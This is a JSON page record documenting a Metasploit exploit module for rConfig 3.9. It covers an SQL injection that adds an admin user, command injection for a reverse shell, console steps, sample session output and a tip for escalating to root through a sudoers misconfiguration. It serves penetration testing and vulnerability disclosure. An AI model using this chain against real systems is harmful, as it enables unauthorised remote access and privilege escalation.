{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/rconfig_ajaxarchivefiles_rce","result":{"data":{"moduleMetadataJson":{"id":"992e17f1-6937-55da-bfa9-26d82f54ba5d","name":"Rconfig 3.x Chained Remote Code Execution","fullname":"exploit/linux/http/rconfig_ajaxarchivefiles_rce","description":"This module exploits multiple vulnerabilities in rConfig version 3.9\n        in order to execute arbitrary commands.\n        This module takes advantage of a command injection vulnerability in the\n        `path` parameter of the ajax archive file functionality within the rConfig web\n        interface in order to execute the payload.\n        Valid credentials for a user with administrative privileges are required.\n        However, this module can bypass authentication via SQLI.\n        This module has been successfully tested on Rconfig 3.9.3 and 3.9.4.\n        The steps are:\n          1. SQLi on /commands.inc.php allows us to add an administrative user.\n          2. An authenticated session is established with the newly added user\n          3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to\n             execute the payload.\n          4. Remove the added admin user.\n        Tips : once you get a shell, look at the CVE-2019-19585.\n        You will probably get root because rConfig install script add Apache user to\n        sudoers with nopasswd ;-)","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/rconfig_ajaxarchivefiles_rce","documentationSlug":"/modules/documentation/exploit/linux/http/rconfig_ajaxarchivefiles_rce","referencesSlug":"/modules/references/exploit/linux/http/rconfig_ajaxarchivefiles_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits multiple vulnerabilities in rConfig version 3.9 and prior in order to execute arbitrary commands.</p>\n<p>The module first add a temporary admin user to the application by exploiting an SQL injection (CVE-2020-10220).</p>\n<p>Next, the module authenticates as the newly created user in order to abuse a command injection vulnerability in the <code class=\"language-text\">path</code> parameter of the ajaxArchiveFiles functionality within the rConfig web interface (CVE-2019-19509).</p>\n<p>The module works with HTTP or HTTPS (both were tested) but the application does redirection via php code so SSL is enabled by default (and should be used). Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via SQLI. This module has been successfully tested on rConfig 3.9.2 and 3.9.4.</p>\n<p>Tips : once you get a shell, look at the CVE-2019-19585. You will probably get root because rConfig install script add Apache user to sudoers with nopasswd ;-)</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the module as usual</li>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/linux/http/rconfig_ajaxarchivefiles_rce</code></li>\n<li><code class=\"language-text\">set RHOSTS target_ip</code></li>\n<li><code class=\"language-text\">set RPORT target_port</code></li>\n<li><code class=\"language-text\">set LHOST your_ip</code></li>\n<li><code class=\"language-text\">set LPORT your_port</code></li>\n<li><code class=\"language-text\">set verbose true</code></li>\n<li><code class=\"language-text\">exploit -j</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/rconfig_ajaxarchivefiles_rce) &gt; show options\n\nModule options (exploit/linux/http/rconfig_ajaxarchivefiles_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT      443              yes       The target port (TCP)\n   SSL        true             no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /                yes       Base path to Rconfig\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Auto\n\nmsf5 exploit(linux/http/rconfig_ajaxarchivefiles_rce) &gt; set RHOSTS 1.1.1.1\nRHOSTS =&gt; 1.1.1.1\nmsf5 exploit(linux/http/rconfig_ajaxarchivefiles_rce) &gt; set LHOST 1.1.1.2\nLHOST =&gt; 1.1.1.2\n\nmsf5 exploit(linux/http/rconfig_ajaxarchivefiles_rce) &gt; \n[+] rConfig version 3.9 detected\n[+] New temporary user 6QpO8mLt created\n[+] Authenticated as user 6QpO8mLt\n[*] Command shell session 1 opened (1.1.1.2:4444 -&gt; 1.1.1.1:34586) at 2020-03-10 22:26:46 +0100\n[+] Command sucessfully executed\n[*] User 6QpO8mLt removed successfully !\n\nmsf5 exploit(linux/http/rconfig_ajaxarchivefiles_rce) &gt; sessions -i 1\n[*] Starting interaction with 1...\nid\nuid=48(apache) gid=48(apache) groups=48(apache)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h2>\n<ol>\n<li><a href=\"https://cvedetails.com/cve/CVE-2019-19509/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://cvedetails.com/cve/CVE-2019-19509/</a></li>\n<li><a href=\"https://cvedetails.com/cve/CVE-2020-10220/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://cvedetails.com/cve/CVE-2020-10220/</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/47982\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/47982</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/48208\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/48208</a></li>\n<li><a href=\"https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2019-19509.py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2019-19509.py</a></li>\n<li><a href=\"https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py</a></li>\n</ol>"}}},"pageContext":{"id":"992e17f1-6937-55da-bfa9-26d82f54ba5d"}}}